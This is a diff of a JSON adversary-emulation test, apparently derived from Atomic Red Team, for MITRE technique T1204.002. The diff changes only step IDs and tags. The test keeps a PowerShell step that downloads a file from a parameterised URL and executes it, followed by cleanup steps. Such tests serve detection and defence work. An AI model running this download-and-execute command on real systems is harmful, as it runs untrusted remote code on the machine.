@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "00b6ea76-6c1e-408f-af71-7b481300450c",
+      "id": "c6f0dcdc-a5c7-4573-a3e6-44e24ca5152b",
       "type": "execute-command",
       "data": {
         "command": "Invoke-WebRequest #{pua_url} -OutFile #{pua_file}\n\u0026 \"#{pua_file}\"\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "237058fe-3501-4b2e-b02e-66791f78facc",
+      "id": "c8c566f6-fece-44f3-bb7f-b267839efecf",
       "type": "execute-command",
       "data": {
         "command": "Stop-Process -name PotentiallyUnwanted\nRemove-Item #{pua_file} -ErrorAction Ignore\n",
@@ -27,19 +27,19 @@
   ],
   "flows": [
     {
-      "s": "00b6ea76-6c1e-408f-af71-7b481300450c",
+      "s": "c6f0dcdc-a5c7-4573-a3e6-44e24ca5152b",
       "p": "on-success",
-      "o": "237058fe-3501-4b2e-b02e-66791f78facc"
+      "o": "c8c566f6-fece-44f3-bb7f-b267839efecf"
     },
     {
-      "s": "00b6ea76-6c1e-408f-af71-7b481300450c",
+      "s": "c6f0dcdc-a5c7-4573-a3e6-44e24ca5152b",
       "p": "on-failure",
-      "o": "237058fe-3501-4b2e-b02e-66791f78facc"
+      "o": "c8c566f6-fece-44f3-bb7f-b267839efecf"
     }
   ],
   "tags": [
-    "T1204.002",
-    "atomic-red-team"
+    "T1204",
+    "T1204.002"
   ],
   "input_arguments": [
     {
